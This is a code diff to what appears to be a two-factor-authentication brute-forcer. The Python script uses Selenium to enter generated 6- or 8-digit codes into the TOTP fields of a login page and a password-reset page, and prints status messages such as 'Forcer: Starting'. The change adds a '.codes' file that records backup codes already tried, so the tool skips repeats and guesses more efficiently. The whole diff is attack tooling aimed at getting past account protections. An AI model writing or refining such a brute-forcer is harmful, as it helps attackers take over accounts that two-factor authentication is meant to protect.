@@ -75,8 +75,17 @@ def TOTP(code):
 					print("TOTP login field: " + toColor("Found","green"))
 					print("Forcer: " + toColor("Starting","green"))
 
-				# Generate a new 8 or 6 digit number and enter it into the TOTP field
+				# Generate a new 8 or 6 digit code and enter it into the TOTP field
 				totp = (code[1](1))
+				# Check if 8 digit code has been used before, if true skip and generate new code
+				if code[1] == genBackup:
+					with open('.codes', 'a+') as f:
+						f.seek(0)
+						codes = f.read() 
+						if totp in codes:
+							continue 
+						else:
+							f.write(totp + '\n')
 				loginTOTP.send_keys(totp)
 				loginTOTP.send_keys(Keys.RETURN)
 				totpCount += 1
@@ -184,8 +193,17 @@ def PR(code):
 					print("TOTP login field: " + toColor("Found","green"))
 					print("Forcer: " + toColor("Starting","green"))
 
-				# Generate a new 8 or 6 digit number and enter it into the TOTP field
+				# Generate a new 8 or 6 digit code and enter it into the TOTP field
 				totp = (code[1](1))
+				# Check if 8 digit code has been used before, if true skip and generate new code
+				if code[1] == genBackup:
+					with open('.codes', 'a+') as f:
+						f.seek(0)
+						codes = f.read() 
+						if totp in codes:
+							continue 
+						else:
+							f.write(totp + '\n')
 				resetTOTP.send_keys(totp)
 				resetTOTP.send_keys(Keys.RETURN)
 				totpCount += 1
